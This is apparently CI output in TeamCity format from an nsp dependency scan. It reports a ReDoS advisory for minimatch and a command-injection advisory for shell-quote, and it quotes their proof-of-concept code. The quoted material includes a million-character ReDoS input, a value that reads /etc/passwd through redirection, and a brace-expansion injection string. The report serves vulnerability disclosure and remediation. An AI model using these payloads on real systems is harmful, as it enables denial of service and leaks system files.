(+) 2 vulnerabilities found
##teamcity[testStarted name='nsp 118 - minimatch']
##teamcity[testFailed name='nsp 118 - minimatch'message='Regular Expression Denial of Service' details='Module: minimatch|nRecommendation: Updated to version 3.0.2 or greater|nInstalled: 3.0.0|nVulnerable: <=3.0.1|nPatched: >=3.0.2|nPath: nsp-formatter-checkstyle@1.0.0 > minimatch@3.0.0|nFile Name: package.json|nOverview: Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\{2})*)(\\?)\||/g,`.  The problematic portion of the regex is `((?:\\{2})*)` which matches against `//`.|n|nA proof of concept is as follows:|n```|nvar minimatch = require(“minimatch”);|n|n// utility function for generating long strings|nvar genstr = function (len, chr) {|n  var result = “”;|n  for (i=0; i<=len; i++) {|n    result = result + chr;|n  }|n  return result;|n}|n|nvar exploit = “|[!” + genstr(1000000, “\\”) + “A”;|n|n// minimatch exploit.|nconsole.log(“starting minimatch”);|nminimatch(“foo”, exploit);|nconsole.log(“finishing minimatch”);|n```|nMore Info: https://nodesecurity.io/advisories/118|n']
##teamcity[testFinished name='nsp 118 - minimatch']
##teamcity[testStarted name='nsp 117 - shell-quote']
##teamcity[testFailed name='nsp 117 - shell-quote'message='Potential Command Injection' details='Module: shell-quote|nRecommendation: Upgrade to at least version 1.6.1|nInstalled: 1.6.0|nVulnerable: <=1.6.0|nPatched: >=1.6.1|nPath: nsp-formatter-checkstyle@1.0.0 > shell-quote@1.6.0|nFile Name: package.json|nOverview: The npm module "shell-quote" cannot correctly escape ">" and "<" operator used for redirection in shell. I|'m wondering if this might be possible vulnerability for many application which depends on shell-quote.|n|nFor example:|n|n   const quote = require(|'shell-quote|').quote;|n   console.log(quote(|[|'foo>bar|'|]));|n|nwill print "foo>bar", where "foo\>bar" is desirable.|n|nThis module is downloaded more than 1M times per month and many other modules are depending on this. If an application is escaping command-line args with this module, they might be vulnerable from malicious user input.|n|nFor example:|n```|nvar sq = require(|'../tests/get/shell-quote-1.6.0|');|nvar exec = require(|'child_process|').exec;|n|nvar pattern = process.argv|[2|];|n|ncommand = sq.quote(|[|'grep|', pattern|]));|nexec(|'cat file || |' + command, function ( err, stdout, stderr) {|n    console.log(command, stdout);   |n});|n```|nwill be vulnerable when user input something like pattern = |':</etc/passwd|', which causes the content of /etc/passwd to be leaked.|n|nInternally, (Jon Lamendola, Nick Starke, Jacob Waddell) found that the `;`, `{`, and `}` characters weren|'t escaped properly either. This allows for full command injection. A malicious user could input `|'a;{echo,test,123,234}|'` to execute echo fully.|nMore Info: https://nodesecurity.io/advisories/117|n']
##teamcity[testFinished name='nsp 117 - shell-quote']
